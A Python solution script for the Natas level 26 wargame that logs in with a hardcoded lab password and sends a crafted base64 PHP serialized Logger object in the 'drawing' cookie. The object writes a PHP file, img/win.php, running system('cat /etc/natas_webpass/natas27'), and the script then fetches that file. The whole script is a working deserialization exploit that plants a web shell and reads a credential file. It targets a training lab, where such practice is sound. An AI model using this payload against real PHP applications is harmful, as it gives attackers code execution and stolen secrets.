import requests as req
import base64
import urllib.parse

username = "natas26"
password = "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"
url = "http://natas26.natas.labs.overthewire.org/"

session = req.Session()
drawingInput = "?x1=9&y1=9&x2=88&y2=88"


response = session.get(url, auth=(username, password))

# modify drawing cookie here
session.cookies['drawing'] = "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMToiaW1nL3dpbi5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30="

response = session.get(url+drawingInput, auth=(username, password))

response = session.get(url + 'img/win.php', auth=(username, password))
print(response.text)
print('*'*30)
# sid = session.cookies['PHPSESSID']
# did = session.cookies['drawing']
# print("session id cookie:", sid)
# print("drawing cookie:", did)  # url AND b64 encoded
# print("url decoded drawing cookie:", urllib.parse.unquote(did))  # b64 encoded
# x = base64.b64decode(urllib.parse.unquote(did))
# print("raw decoded drawing cookie:", x)

# now we have x as the php serialized data
